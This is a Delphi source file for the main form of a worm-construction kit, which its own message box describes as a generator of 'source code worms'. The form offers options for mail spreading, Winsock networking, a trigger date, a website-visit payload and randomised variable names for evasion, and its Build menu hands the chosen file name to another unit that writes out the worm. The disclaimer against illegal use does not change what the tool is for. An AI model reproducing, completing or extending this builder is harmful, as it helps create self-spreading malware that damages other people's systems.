unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, StdCtrls, ComCtrls, ExtCtrls;

type
  TForm1 = class(TForm)
    StatusBar1: TStatusBar;
    Label1: TLabel;
    Edit1: TEdit;
    CheckBox1: TCheckBox;
    Label2: TLabel;
    Label3: TLabel;
    CheckBox2: TCheckBox;
    CheckBox3: TCheckBox;
    CheckBox5: TCheckBox;
    CheckBox6: TCheckBox;
    Button1: TButton;
    CheckBox7: TCheckBox;
    CheckBox8: TCheckBox;
    Button2: TButton;
    CheckBox9: TCheckBox;
    Button3: TButton;
    CheckBox10: TCheckBox;
    Button4: TButton;
    CheckBox11: TCheckBox;
    Button5: TButton;
    MainMenu1: TMainMenu;
    File1: TMenuItem;
    Build1: TMenuItem;
    Exit1: TMenuItem;
    Exit2: TMenuItem;
    Exit3: TMenuItem;
    Button6: TButton;
    CheckBox4: TCheckBox;
    CheckBox12: TCheckBox;
    Panel1: TPanel;
    Memo1: TMemo;
    CheckBox13: TCheckBox;
    Button9: TButton;
    CheckBox14: TCheckBox;
    Button10: TButton;
    CheckBox15: TCheckBox;
    Button11: TButton;
    Edit2: TEdit;
    Label4: TLabel;
    Edit3: TEdit;
    procedure Exit3Click(Sender: TObject);
    procedure Build1Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure CheckBox5MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CheckBox6MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CheckBox7MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CheckBox8MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CheckBox8KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure CheckBox7KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure CheckBox6KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure CheckBox5KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure CheckBox3KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure CheckBox3MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CheckBox11MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CheckBox11KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure Exit1Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure Button11Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button10Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure Edit2Change(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

Uses Unit2, Unit4, Unit6, Unit7, Unit3, Unit5, Unit8, Unit9, Unit10, Unit11;

{$R *.dfm}

procedure TForm1.Exit3Click(Sender: TObject);
begin
ExitProcess(0);
end;

procedure TForm1.Build1Click(Sender: TObject);
var
 str:string;
 i  :Integer;
 abc:String;
begin
 Abc := 'abcdefghijklmnopqrstuvwxyz';
 For I := 1 To Length(Edit1.text) Do
  If Pos(LowerCase(Copy(Edit1.Text, i, 1)), abc)=0 Then Begin
   MessageBox(0, 'Invalid filename', 'Error', mb_ok); 
   Exit;
  End;
 str := 'This generator only generates SOURCE CODE WORMS'+#13#10+
        'and if you dont know how to compile it dont use it.'+#13#10+
        'Dont mail me about questions about how to compile or '+#13#10+
        'what delphi is. Thank you /p0ke'+#13#10+#13#10;
 str := Str + 'This program is not made for any illegal use or abusement'+#13#10+
        'of other peoples systems.'+#13#10+
        'Do you accept to take fully resonsibility for your own'+#13#10+
        'creations? If not, press "No" and remove this program';
 If MessageBox(0, pChar(Str), 'Warning', Mb_yesno) <> ID_YES Then
  Exit;

 form2.hide;
 form3.hide;
 form4.hide;
 form5.hide;
 form6.hide;
 form7.hide;

 If CheckBox3.Checked Then Begin
  If (Not CheckBox7.Checked) And (Not CheckBox8.Checked) Then Begin
   MessageBox(0, 'You have to choose mail-settings', 'Error', Mb_ok);
  End;
 End;

 Form8.show;
 Form8.Build(Edit1.text);

end;

procedure TForm1.Button1Click(Sender: TObject);
begin
if not checkbox5.Checked then exit;
Form2.Show;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
if not checkbox8.Checked then exit;
form4.show;
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
if not checkbox10.Checked then exit;
form6.show;
end;

procedure TForm1.Button5Click(Sender: TObject);
begin
if not checkbox11.Checked then exit;
Form7.Show;
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
if not checkbox9.Checked then exit;
form5.Show;
end;

procedure TForm1.CheckBox5MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if checkbox5.Checked then checkbox6.Enabled := False else checkbox6.Enabled := True;
end;

procedure TForm1.CheckBox6MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if checkbox6.Checked then checkbox5.Enabled := False else checkbox5.Enabled := True;
end;

procedure TForm1.CheckBox7MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if checkbox7.Checked then checkbox8.Enabled := False else checkbox8.Enabled := True;
end;

procedure TForm1.CheckBox8MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if checkbox8.Checked then checkbox7.Enabled := False else checkbox7.Enabled := True;
end;

procedure TForm1.CheckBox8KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
ZeroMemory(@Key, SizeOf(Key));
end;

procedure TForm1.CheckBox7KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
ZeroMemory(@Key, SizeOf(Key));
end;

procedure TForm1.CheckBox6KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
ZeroMemory(@Key, SizeOf(Key));
end;

procedure TForm1.CheckBox5KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
ZeroMemory(@Key, SizeOf(Key));
end;

procedure TForm1.CheckBox3KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
ZeroMemory(@Key, SizeOf(Key));
end;

procedure TForm1.CheckBox3MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if checkbox3.Checked then Statusbar1.Panels[0].Text := 'Libraries : Windows, Winsock' else
                          if not checkbox11.Checked then
                           Statusbar1.Panels[0].Text := 'Libraries : Windows';
end;

procedure TForm1.CheckBox11MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if checkbox11.Checked then Statusbar1.Panels[0].Text := 'Libraries : Windows, Winsock' else
                           if not checkbox3.Checked then
                            Statusbar1.Panels[0].Text := 'Libraries : Windows';
end;

procedure TForm1.CheckBox11KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
ZeroMemory(@Key, SizeOf(Key));
end;

procedure TForm1.Exit1Click(Sender: TObject);
begin
Form9.Show;
end;

procedure TForm1.Button6Click(Sender: TObject);
begin
MessageBox(0, 'This will change all variables into random names.'+#13#10+
              'Its not recommended, cus there is always a LITTLE chance'+#13#10+
              'that two variables gets same.', 'Info', mb_ok);
end;

procedure TForm1.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
ExitProcess(0);
end;

procedure TForm1.Button11Click(Sender: TObject);
begin
if not checkbox15.Checked then exit;
Form10.show;
end;

procedure TForm1.Button9Click(Sender: TObject);
begin
if not checkbox13.Checked then exit;
Form11.show;
end;

procedure TForm1.Button8Click(Sender: TObject);
begin
if not checkbox12.Checked then exit;
end;

procedure TForm1.Button7Click(Sender: TObject);
begin
if not checkbox4.Checked then exit;
end;

procedure TForm1.Button10Click(Sender: TObject);
begin
if not checkbox14.Checked then exit;
edit3.text := inputbox('Site', 'Enter a site to visit', 'http://');
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
edit2.height := 21;
end;

procedure TForm1.FormActivate(Sender: TObject);
begin
edit2.height := 21;
end;

procedure TForm1.Edit2Change(Sender: TObject);
begin
StatusBar1.Panels[1].Text := 'Trigger Date : '+Edit2.text;
 MainMenu1.Items[0].Items[0].Enabled := True;
If Length(Edit2.text) < 5 Then Begin
 MainMenu1.Items[0].Items[0].Enabled := False;
 Exit;
End;
If Copy(Edit2.text, 1, 2) = '00' then
 MainMenu1.Items[0].Items[0].Enabled := False;
If Copy(Edit2.text, 3, 1) <> '/' then
 MainMenu1.Items[0].Items[0].Enabled := False;
If strtoint(Copy(Edit2.text, 4, 2)) > 12 then
 MainMenu1.Items[0].Items[0].Enabled := False;

end;

end.
